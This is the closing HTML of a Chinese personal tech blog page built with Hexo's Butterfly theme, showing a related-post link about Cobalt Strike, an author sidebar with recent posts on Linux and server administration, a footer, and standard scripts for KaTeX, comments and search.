class="far fa-calendar-alt fa-fw"></i> 2022-04-26</div><div class="info-item-2">Cobalt Strike使用</div></div><div class="info-2"><div class="info-item-1"> Cobalt Strike基础教程 Cobalt Strike使用教程一  https://zhuanlan.zhihu.com/p/359251293 </div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC80NzA1My8yMzU1Mw=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LYC</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护"><img src="/images/Wallpaper/rainbowcat.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="4GPU服务器环境配置及维护"/></a><div class="content"><a class="title" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护">4GPU服务器环境配置及维护</a><time datetime="2023-08-29T12:00:26.000Z" title="发表于 2023-08-29 20:00:26">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="UEFI+systemd开机启动流程"/></a><div class="content"><a class="title" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程">UEFI+systemd开机启动流程</a><time datetime="2023-08-29T08:39:54.000Z" title="发表于 2023-08-29 16:39:54">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="udev配置Linux网络接口"/></a><div class="content"><a class="title" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口">udev配置Linux网络接口</a><time datetime="2023-08-27T12:49:29.000Z" title="发表于 2023-08-27 20:49:29">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="实验室服务器网络运维"/></a><div class="content"><a class="title" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维">实验室服务器网络运维</a><time datetime="2023-08-27T12:20:23.000Z" title="发表于 2023-08-27 20:20:23">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="Attention机制_transformer"/></a><div class="content"><a class="title" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer">Attention机制_transformer</a><time datetime="2022-11-21T11:55:15.000Z" title="发表于 2022-11-21 19:55:15">2022-11-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By LYC</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(async () => {
+  const showKatex = () => {
+    document.querySelectorAll('#article-container .katex').forEach(el => el.classList.add('katex-show'))
+  }
+
+  if (!window.katex_js_css) {
+    window.katex_js_css = true
+    await btf.getCSS('https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css')
+    if (true) {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js')
+    }
+  }
+
+  showKatex()
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+
+  const loadLivere = (el, path) => {
+    window.livereOptions = {
+      refer: path || location.pathname
+    }
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyLivere = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    if (typeof LivereTower === 'object') window.LivereTower.init()
+    else {
+      (function(d, s) {
+          var j, e = d.getElementsByTagName(s)[0];
+          if (typeof LivereTower === 'function') { return; }
+          j = d.createElement(s);
+          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+          j.async = true;
+          e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    }
+  }
+
+  if (isShuoshuo) {
+    'Livere' === 'Livere'
+      ? window.shuoshuoComment = { loadComment: loadLivere }
+      : window.loadOtherComment = loadLivere
+    return
+  }
+
+  if ('Livere' === 'Livere' || !false) {
+    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+    else loadLivere()
+  } else {
+    window.loadOtherComment = loadLivere
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
